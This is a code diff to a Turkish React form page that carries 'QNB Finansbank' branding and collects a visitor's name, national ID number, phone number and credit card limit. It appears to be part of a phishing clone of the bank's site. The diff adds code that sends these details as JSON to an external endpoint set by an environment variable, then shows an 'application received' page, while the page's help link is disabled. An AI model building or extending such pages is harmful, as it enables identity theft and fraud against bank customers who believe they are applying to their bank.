@@ -1,9 +1,10 @@
-import React from 'react';
+import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
-import './App.css'; // mevcut stillerin
+import './App.css';
 
 function Bilgi() {
   const navigate = useNavigate();
+  const [error, setError] = useState(null);
 
   const handleInput = (e, type) => {
     const el = e.target;
@@ -14,9 +15,55 @@ function Bilgi() {
     }
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
-    navigate('/basvuru-alindi');
+
+    // Form verilerini topla
+    const formData = new FormData(e.target);
+    const data = {
+      isim: formData.get('isim'),
+      soyisim: formData.get('soyisim'),
+      tc: formData.get('tc'),
+      tel: formData.get('tel'),
+      kredi_karti_limiti: formData.get('kredi_karti_limiti'),
+    };
+
+    // Frontend veri doğrulama
+    if (data.tc.length !== 11) {
+      setError('T.C. Kimlik No 11 hane olmalıdır.');
+      return;
+    }
+    if (data.tel.length !== 10) {
+      setError('Telefon numarası 10 hane olmalıdır.');
+      return;
+    }
+
+    try {
+      const apiUrl = process.env.REACT_APP_API_URL;
+      if (!apiUrl) {
+        throw new Error('API URL tanımlı değil. Lütfen ortam değişkenlerini kontrol edin.');
+      }
+
+      const response = await fetch(apiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+      });
+
+      if (!response.ok) {
+        const errorData = await response.json();
+        throw new Error(errorData.error || 'API isteği başarısız');
+      }
+
+      const result = await response.json();
+      console.log('API yanıtı:', result);
+      navigate('/basvuru-alindi');
+    } catch (err) {
+      setError(err.message || 'Bir hata oluştu, lütfen tekrar deneyin.');
+      console.error('Hata:', err);
+    }
   };
 
   return (
@@ -35,6 +82,7 @@ function Bilgi() {
               }}
             >
               <div className="subPanel-width">
+                {error && <p style={{ color: 'red' }}>{error}</p>}
                 <form method="post" action="#" onSubmit={handleSubmit}>
                   <div className="row">
                     <div className="col-lg-6 col-12">
@@ -67,7 +115,6 @@ function Bilgi() {
                         </div>
                       </div>
                     </div>
-
                     <div className="col-12">
                       <div className="form-group">
                         <span className="loginlabel">T.C. Kimlik No</span>
@@ -82,7 +129,6 @@ function Bilgi() {
                         />
                       </div>
                     </div>
-
                     <div className="col-12">
                       <div className="form-group">
                         <span className="loginlabel">Telefon Numarası</span>
@@ -97,7 +143,6 @@ function Bilgi() {
                         />
                       </div>
                     </div>
-
                     <div className="col-12">
                       <div className="form-group">
                         <span className="loginlabel">Kredi Kartı Limiti</span>
@@ -111,9 +156,8 @@ function Bilgi() {
                         />
                       </div>
                     </div>
-
                     <div className="col-lg-6 col-12">
-                      <button id="formSubmit" className="ileriButton">
+                      <button id="formSubmit" className="ileriButton" type="submit">
                         Başvur
                       </button>
                     </div>
@@ -121,7 +165,6 @@ function Bilgi() {
                 </form>
               </div>
             </div>
-
             <div className="col-lg-4 col-md-5 col-12 row-left-padding" style={{ paddingRight: '0px' }}>
               <div className="qr_area d-none d-lg-block d-xl-block">
                 <table>
@@ -190,8 +233,8 @@ function Bilgi() {
                               color: '#0a7d2b',
                               fontWeight: 'bold',
                               textDecoration: 'underline',
-                              pointerEvents: 'none', // tıklamayı devre dışı bırakır
-                              cursor: 'default', // link imlecini kapatır
+                              pointerEvents: 'none',
+                              cursor: 'default',
                             }}
                           >
                             buraya
@@ -203,14 +246,13 @@ function Bilgi() {
                   </tbody>
                 </table>
               </div>
-
               <div className="info-box" style={{ visibility: 'visible', display: 'contents', top: '320px' }}>
                 <h3>
                   <span>QNB Finansbank</span>
                 </h3>
                 <ul>
                   <li>
-                   <br />
+                    <br />
                     Detaylı bilgi için{' '}
                     <a
                       href="/"
